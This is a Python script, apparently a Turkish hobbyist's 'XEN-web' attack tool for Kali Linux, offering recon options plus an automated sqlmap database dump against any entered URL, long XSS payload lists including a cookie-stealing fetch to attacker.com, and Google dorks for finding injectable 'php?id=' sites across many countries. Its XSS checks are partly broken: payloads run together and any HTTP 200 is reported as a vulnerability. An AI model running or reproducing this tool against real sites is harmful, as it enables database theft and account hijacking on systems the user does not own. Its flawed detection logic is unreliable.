import subprocess
import platform
import socket
import dns.resolver
import whois
import requests
import os
import time
import sys
from bs4 import BeautifulSoup
from colorama import Fore, Style

os.system("clear")
os.system("pip install python-whois")
os.system("pip install requests")
os.system("pip install beautifulsoup4")
os.system("pip3 install dnspython")
os.system("clear")


print(Fore.RED + "")
def get_local_ip():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        local_ip = sock.getsockname()[0]
        sock.close()
        return local_ip
    except socket.error:
        return "IP adresi alınamadı."

ip_address = get_local_ip()
print("ip adresin:", ip_address)
hostname = socket.gethostname()
print("ana bilgisayar adın:", hostname)
response = requests.get("http://ip-api.com/json")
data = response.json()
gateway = data["query"]
print("Kullanılan ip:", gateway)
time.sleep(2)


print(Fore.GREEN + "")
def yukleme_animasyonu():
    animasyon_karakterleri = ["|", "/", "-", "\\"]
    for i in range(10):
        animasyon = f"Yükleniyor... {animasyon_karakterleri[i % len(animasyon_karakterleri)]}"
        sys.stdout.write(animasyon)
        sys.stdout.flush()
        time.sleep(0.1)
        sys.stdout.write("\b" * len(animasyon))
        sys.stdout.flush()

yukleme_animasyonu()
print("Yüklendi <3")

os.system("clear")

print(Fore.RED + """


    .-----.
   .' -   - '.
  /  .-. .-.  *
  |  | | | |  |
   \ \o/ \o/ /
  _/    ^    \_
 | \  '---'  / |
 / /`--. .--`\ *
/ /'---` `---'\ *
'.__.       .__.'
    `|     |`
     |     *
     \      '--.
      '.        `*
        `'-      /
           ,__) /
            `..'
      XEN-web 1.0v
TAMAMEN KALI LINUX İÇİN KODLANMIŞTIR 

""")
print(Style.RESET_ALL)

print(Fore.CYAN + """

(1) PING TARA
(2) DNS SORGU
(3) WHOIS SORGU
(4) HTTP KONTROLü
(5) SQL SALDIRISI
(6) XSS SALDIRISI
(7) KULLANIM KOŞULLARI
(8) DMITRY SORGU
(9) DORK ÜRETİCİSİ
(10) ÇIKIŞ

""")

print(Style.RESET_ALL)

print(Fore.YELLOW + "")
islemno = input("root@XEN-web:~ ")
print(Style.RESET_ALL)

def ping(host):


    os.system("clear")
    print(Fore.MAGENTA + "")
    print("""


██████╗ ██╗███╗   ██╗ ██████╗
██╔══██╗██║████╗  ██║██╔════╝
██████╔╝██║██╔██╗ ██║██║  ███╗
██╔═══╝ ██║██║╚██╗██║██║   ██║
██║     ██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ """)


    print(Fore.GREEN + "")
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    command = ['ping', param, '4', host]
    response = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    if response.returncode == 0:
        print(f"{host} adresine başarıyla ping atıldı.")
        print(response.stdout)
    else:
        print(f"{host} adresine ping atılamadı.")
        print(response.stderr)

def dns_lookup(domain):

    os.system("clear")
    print(Fore.MAGENTA + "")
    print("""


 ▄▄▄▄▄▄▄▄▄▄   ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄
▐░░░░░░░░░░▌ ▐░░▌      ▐░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀▀▀
▐░▌       ▐░▌▐░▌▐░▌    ▐░▌▐░▌
▐░▌       ▐░▌▐░▌ ▐░▌   ▐░▌▐░█▄▄▄▄▄▄▄▄▄
▐░▌       ▐░▌▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌
▐░▌       ▐░▌▐░▌   ▐░▌ ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌
▐░▌       ▐░▌▐░▌    ▐░▌▐░▌          ▐░▌
▐░█▄▄▄▄▄▄▄█░▌▐░▌     ▐░▐░▌ ▄▄▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░▌ ▐░▌      ▐░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀   ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀▀""")



    print(Fore.GREEN + "")
    record_types = ['A', 'MX', 'NS', 'TXT', 'SOA']
    resolver = dns.resolver.Resolver()
    for record_type in record_types:
        try:
            answers = resolver.resolve(domain, record_type)
            for answer in answers:
                print(f"{record_type} : {answer.to_text()}")
        except dns.resolver.NoAnswer:
            print(f"{record_type} kaydı bulunamadı.")
        except dns.resolver.NXDOMAIN:
            print(f"{domain} alan adı bulunamadı.")
            break
        except Exception as e:
            print(f"Bir hata oluştu: {e}")
            break

def whois_lookup(domain):

    os.system("clear")
    print(Fore.MAGENTA + "")
    print("""


 __    __  __ __   ___  ____  _____
|  T__T  T|  T  T /   \l    j/ ___/
|  |  |  ||  l  |Y     Y|  T(   \_ 
|  |  |  ||  _  ||  O  ||  | \__  T
l  `  '  !|  |  ||     ||  | /  \ |
 \      / |  |  |l     !j  l \    |
  \_/\_/  l__j__j \___/|____j \___j
                                   """)
    print(Fore.GREEN + "")

    try:
        w = whois.whois(domain)
        details = {
            'domain_name': 'Domain Adı',
            'registrar': 'Registrar',
            'whois_server': 'WHOIS Sunucusu',
            'referral_url': 'Referral URL',
            'updated_date': 'Güncellenme Tarihi',
            'creation_date': 'Oluşturulma Tarihi',
            'expiration_date': 'Son Kullanma Tarihi',
            'name_servers': 'Ad Sunucuları',
            'status': 'Durum',
            'emails': 'Email',
            'dnssec': 'DNSSEC',
            'name': 'İsim',
            'org': 'Organizasyon',
            'address': 'Adres',
            'city': 'Şehir',
            'state': 'Eyalet',
            'zipcode': 'Posta Kodu',
            'country': 'Ülke'
        }
        for key, value in details.items():
            if key in w and w[key]:
                print(f"{value}: {w[key]}")
    except Exception as e:
        print(f"WHOIS sorgusunda bir hata oluştu: {e}")

def http_header_check(url):

    os.system("clear")
    print(Fore.MAGENTA + "")
    print("""


  ▄█    █▄        ███         ███        ▄███████▄
  ███    ███   ▀█████████▄ ▀█████████▄   ███    ███
  ███    ███      ▀███▀▀██    ▀███▀▀██   ███    ███
 ▄███▄▄▄▄███▄▄     ███   ▀     ███   ▀   ███    ███
▀▀███▀▀▀▀███▀      ███         ███     ▀█████████▀
  ███    ███       ███         ███       ███
  ███    ███       ███         ███       ███
  ███    █▀       ▄████▀      ▄████▀    ▄████▀
                                              """)

    print(Fore.GREEN + "")

    try:
        response = requests.head(url)
        print(f"HTTP Başlıklar:\n")
        for header, value in response.headers.items():
            print(f"{header}: {value}")
    except Exception as e:
        print(f"HTTP Kontrolü sırasında bir hata oluştu: {e}")
def sql_attack():

  os.system("clear")
  print(Fore.RED + "")  
  print("""
 █████████     ██████    █████
 ███░░░░░███  ███░░░░███ ░░███
░███    ░░░  ███    ░░███ ░███
░░█████████ ░███     ░███ ░███
 ░░░░░░░░███░███   ██░███ ░███      █
░░█████████  ░░░██████░██ ███████████
 ░░░░░░░░░     ░░░░░░ ░░ ░░░░░░░░  """)
  print(Style.RESET_ALL)
  print(Fore.CYAN + "")
  print("Bu program enesxsec ve ghost0x02 tarafından kodlanmıştır...")
  print("---------------------------------------------------")
  print("Bir dakika...")
  time.sleep(1)
  os.system("git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev")
  os.chdir("sqlmap-dev")
  os.system("python3 sqlmap.py -u " + url + " --dbs")
  db = input("Hangi veritabanının içe aktarılacağını seçin: ")
  os.system("clear")
  os.system("python3 sqlmap.py -u " + url + " -D " + db + " --tables")
  tb = input("Hangi tabloyu çekeceğinizi seçin: ")
  os.system("clear")
  os.system("python3 sqlmap.py -u " + url + " -D " + db + " -T " + tb + " --columns")
  cl = input("Hangi sütunları çekeceğinizi seçin: ")
  os.system("clear")
  os.system("python3 sqlmap.py -u " + url + " -D " + db + " -T " + tb + " -C " + cl + " --dump")

def xss_scan(url):

    os.system("clear")
    print(Fore.RED + """

 ██╗  ██╗███████╗███████╗
 ╚██╗██╔╝██╔════╝██╔════╝
  ╚███╔╝ ███████╗███████╗
  ██╔██╗ ╚════██║╚════██║ attack 1.0v
 ██╔╝ ██╗███████║███████║
 ╚═╝  ╚═╝╚══════╝╚══════╝

""")

    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(Fore.YELLOW + f"{url} adresi başarıyla tarandı!")
            print(Fore.RED + "")
            time.sleep(4)
            soup = BeautifulSoup(response.content, 'html.parser')
            forms = soup.find_all('form')

            for form in forms:
                print(f"Form bulundu: {form}")
                stored_xss_test(soup, url)
                reflected_xss_test(form, url)
                dom_based_xss_test(form, url)
                blind_xss_test(form, url)

        else:
            print(f"URL'ye bağlanırken bir hata oluştu. Durum kodu: {response.status_code}")

    except Exception as e:
        print(f"XSS taraması sırasında bir hata oluştu: {e}")

def stored_xss_test(soup, url):
    stored_xss_payloads = [
        '<script>alert("Stored XSS Attack")</script>',
        '<img src="x" onerror="alert(\'Stored XSS Attack\')" />',
        '<svg onload="alert(\'Stored XSS Attack\')"></svg>'
        '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pg=="></EMBED>',
        '<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>',
        '<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">',
        '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">',
        '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"></HEAD>+ADw-SCRIPT+AD4-alert(\'XSS\');+ADw-/SCRIPT+AD4-',
        '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
        '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
        '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
        '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
        '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
        '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
        '<IMG SRC="jav&#x0C;ascript:alert(\'XSS\');">',
        '<IMG SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pg=="></EMBED>',
        '<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>',
        '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',
        '<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
        '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>',
        '<IMG DYNSRC="javascript:alert(\'XSS\')">',
        '<IMG LOWSRC="javascript:alert(\'XSS\')">',
        '<BGSOUND SRC="javascript:alert(\'XSS\');">',
        '<BR SIZE="&{alert(\'XSS\')}">',
        '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
        '<IMG SRC=\'vbscript:msgbox("XSS")\'>',
        '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
        '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
    ]

    for payload in stored_xss_payloads:
        if payload in soup.text:
            print(f"Stored XSS zafiyeti bulundu: {url} - Payload: {payload}")

def reflected_xss_test(form, url):
    reflected_xss_payloads = [
        '<script>alert("Reflected XSS Attack")</script>',
        '<img src="x" onerror="alert(\'Reflected XSS Attack\')" />',
        '<svg onload="alert(\'Reflected XSS Attack\')"></svg>'
        '<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
        '<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
        '<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
        '<SCRIPT "a=\'>\'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
        '<SCRIPT a=> SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
        '<SCRIPT a=">\'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
        '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
        '<A HREF="http://66.102.7.147/">XSS</A>',
        '<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>',
        '<A HREF="http://1113982867/">XSS</A>',
        '<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>',
        '<A HREF="http://0102.0146.0007.00000223/">XSS</A>',
        '<A HREF="htt   p://6   6.000146.0x7.147/">XSS</A>',
        '<input/onmouseover="javaSCRIPT:confirm(1)">',
        '<sVg><scRipt %00>alert(1) {Opera}',
        '<img/src=%00 onerror=this.onerror=confirm(1)>',
        '<IMG><SCRIPT>alert("XSS")</SCRIPT>">',
        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
        '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
        '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
        '<IMG SRC=javascript:alert("XSS")>',
        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
        '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
        '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
        '<IMG SRC=javascript:alert("XSS")>',
        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
        '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
        '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
        '<IMG SRC=javascript:alert("XSS")>',
        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
        '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
        '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
        '<IMG SRC=javascript:alert("XSS")>',
        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
        '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
        '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
        '<IMG SRC=javascript:alert("XSS")>',
        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
        '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
        '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
        '<IMG SRC=javascript:alert("XSS")>',
    ]

    for payload in reflected_xss_payloads:
        for input_field in form.find_all('input'):
            input_field['value'] = payload
            response = requests.post(url, data=form)
            if payload in response.text:
                print(f"Reflected XSS zafiyeti bulundu: {url} - Payload: {payload}")

def dom_based_xss_test(form, url):
    dom_based_xss_payloads = [
        '<script>document.write("DOM-based XSS Attack")</script>',
        '<img src="x" onerror="alert(\'DOM-based XSS Attack\')" />',
        '<svg onload="alert(\'DOM-based XSS Attack\')"></svg>'
    ]

    for payload in dom_based_xss_payloads:
        for input_field in form.find_all('input'):
            input_field['value'] = payload
            response = requests.post(url, data=form)
            if payload in response.text:
                print(f"DOM-based XSS zafiyeti bulundu: {url} - Payload: {payload}")

def blind_xss_test(form, url):
    blind_xss_payloads = [
        '<img src="x" onerror="alert(\'Blind XSS Attack\')" />',
        '<script src="https://attacker.com/malicious.js"></script>',
        '<svg><script>fetch("https://attacker.com/steal-cookies")</script></svg>'
    ]

    for payload in blind_xss_payloads:
        for input_field in form.find_all('input'):
            input_field['value'] = payload
            response = requests.post(url, data=form)
            if response.status_code == 200:
                print(f"Blind XSS zafiyeti bulundu: {url} - Payload: {payload}")

def kullanım_koşulları():
    print(Fore.GREEN + """



          KULLANIM KOŞULLARINA HOŞ GELDİNİZ""")

    print("          yükleniyor...        ")
    time.sleep(4)
    os.system("clear")
    print(Fore.RED + """

{__   {__  {__     {__{__      {__            {_       {___     {__{__{__       {__
{__  {__   {__     {__{__      {__           {_ __     {_ {__   {__{__{_ {__   {___
{__ {__    {__     {__{__      {__          {_  {__    {__ {__  {__{__{__ {__ { {__
{_ {_      {__     {__{__      {__         {__   {__   {__  {__ {__{__{__  {__  {__
{__  {__   {__     {__{__      {__        {______ {__  {__   {_ {__{__{__   {_  {__
{__   {__  {__     {__{__      {__       {__       {__ {__    {_ __{__{__       {__
{__     {__  {_____   {________{________{__         {__{__      {__{__{__       {__



    (1) SORGU YAPARKEN TAMAMEN KENDİ SİSTEMLERİNİZ ÜZERİNDEN YAPIN
    (2) BU SİBER GÜVENLİK YAZILIMININ SORUMLUSU HERHANGİ BİR YASAL İŞLEM KABUL ETMEYECEKTİR!!!
    (3) XSS-SQL GİBİ BÜYÜK ZAFİYET TARAYAN PROGRAMLARI SADECE TEST İÇİN KULLANIN
    (4) YAPILAN BÜTÜN TARAMALAR KENDİ SORUMLULUĞUNUZ ÜZERİNEDİR
    (5) XSS NEDİR?

        XSS (Cross-Site Scripting), Türkçe olarak "Kurumlararası Komut Dosyası Çapraz Etkileşimi" anlamına gelir. 
        Bu bir web güvenlik açığıdır ve saldırganların web uygulamaları üzerinden
        kullanıcıların tarayıcılarında kötü niyetli komut dosyaları çalıştırmasına olanak tanır.

        Peki bu XSS aracında kullanılan Blind açığı nedir?

        XSS (Cross-Site Scripting) blind açığı, klasik XSS açıklarından farklı olarak,
        saldırganın kötü niyetli komut dosyalarını direkt olarak göremediği veya sonuçları doğrudan alamadığı durumları ifade eder.
        Bu tür bir açıkta, saldırgan tarafından enjekte edilen XSS payload'u çalıştırılırken,
        sonuçlar genellikle tarayıcıda doğrudan görüntülenmez veya saldırganın kontrolü dışındaki bir şekilde gerçekleşir.

        XSS blind açıkları genellikle sızma testleri ve güvenlik açısından önemli bir konudur
        çünkü saldırganlar tarafından istismar edilebilir ve saldırıya uğramış web uygulamalarında fark edilmesi zor olabilir.
        Bu tür açıklardan korunmak için web uygulamaları giriş doğrulama, veri filtreleme ve güvenlik kontrolleri gibi önlemler almalıdır.
        Ayrıca, düzenli güvenlik testleri ve güvenlik bilinci eğitimleri de önemli rol oynar.

    (6) SQL SALDIRISI NEDİR?

        SQL saldırısı (SQL Injection),
        web uygulamalarında yaygın olarak görülen bir güvenlik açığıdır.
        Bu açık, saldırganların web uygulamalarının SQL tabanlı veritabanlarına istismar ederek
        kötü niyetli SQL sorguları göndermesine izin verir.

    (7) NEYİ HEDEFLİYORUZ?

       - internet sitelerinin güvenlik açıklarını test etmeyi.
       - Eğer açık bulunduysa site sahiplerine bildirmeyi.
       - SQL VE XSS gibi zafiyet araçlarının doğru kullanımını.
       - Siber Güvenlik yapmak için saygın birisi olmanızı hedefliyoruz :D <3.

                       iletişim == ig: xsecit """)



def dmt():

    os.system("clear")
    print(Fore.RED + """


██████╗ ███╗   ███╗██╗████████╗██████╗ ██╗   ██╗
██╔══██╗████╗ ████║██║╚══██╔══╝██╔══██╗╚██╗ ██╔╝
██║  ██║██╔████╔██║██║   ██║   ██████╔╝ ╚████╔╝
██║  ██║██║╚██╔╝██║██║   ██║   ██╔══██╗  ╚██╔╝
██████╔╝██║ ╚═╝ ██║██║   ██║   ██║  ██║   ██║
╚═════╝ ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝
""")


    os.system(f"dmitry -w {url}")
    time.sleep(2)
    os.system(f"dmitry -i {url}")
    time.sleep(2)
    os.system(f"dmitry -n {url}")
    time.sleep(2)
    os.system(f"dmitry -s {url}")
    time.sleep(2)
    os.system(f"dmitry -e {url}")
    time.sleep(2)


def dork():

    os.system("clear")

    print(Fore.RED + """

'||''|.    ..|''||   '||''|.   '||'  |'
 ||   ||  .|'    ||   ||   ||   || .'
 ||    || ||      ||  ||''|'    ||'|.
 ||    || '|.     ||  ||   |.   ||  ||
.||...|'   ''|...|'  .||.  '|' .||.  ||.

         (DORK LİSTESİ)""")

    time.sleep(2)
    print(Fore.CYAN + """

    inurl:"php?id=" "com"
    inurl:"php?id=" "edu"
    """)
    time.sleep(2)
    print(""" 

    inurl:"php?id=" "net"
    inurl:"php?id=" "edu.tr"
    """)
    time.sleep(2)
    print("""

    inurl:"php?id=" "biz"
    inurl:"php?id=" "org"
    """)
    time.sleep(2)
    print("""

    inurl:"php?id=" "cat"
    inurl:"php?id=" "k12.tr"
    """)
    time.sleep(2)
    print("""

    inurl:"php?id=" "bel.tr"
    inurl:"php?id=" "br"
    """)
    time.sleep(2)
    print("""

    inurl:"php?id=" "ar"
    inurl:"php?id=" "az"
    """)
    time.sleep(2)
    print("""

    inurl:"php?id=" "cn"
    inurl:"php?id=" "it"
    """)
    time.sleep(2)
    print("""

    inurl:"php?id=" "pk"
    inurl:"php?id=" "pl"
    """)

def exit():

    print(Fore.CYAN + "Görüşürüz dost!")

if islemno == "1":
    print(Fore.MAGENTA + "")
    host = input("Ping taramak istediğiniz IP adresini veya site adını girin: ")
    ping(host)
elif islemno == "2":
    print(Fore.MAGENTA + "")
    domain = input("DNS sorgusu yapmak istediğiniz site adını girin: ")
    dns_lookup(domain)
elif islemno == "3":
    print(Fore.MAGENTA + "")
    domain = input("WHOIS sorgusu yapmak istediğiniz site adını girin: ")
    whois_lookup(domain)
elif islemno == "4":
    print(Fore.MAGENTA + "")
    url = input("HTTP kontroü yapmak istediğiniz URL'yi girin: ")
    http_header_check(url)
elif islemno == "5":
    print(Fore.MAGENTA + "")
    url = input("SQL saldırısı  yapmak istediğiniz URL adresini girin: ")
    sql_attack()
elif islemno == "6":
    print(Fore.MAGENTA + "")
    url = input("XSS taraması yapmak istediğiniz URL adresini girin: ")
    xss_scan(url)
elif islemno == "7":
    print(Fore.MAGENTA + "")
    kullanım_koşulları()
elif islemno == "8":
    print(Fore.MAGENTA + "")
    url = input("Dmitry taraması yapmak istediğiniz URL adresini girin: ")
    dmt()
elif islemno == "9":
    dork()
elif islemno == "10":
    exit()
else:
    print(Fore.RED + "Geçersiz seçenek!!!")
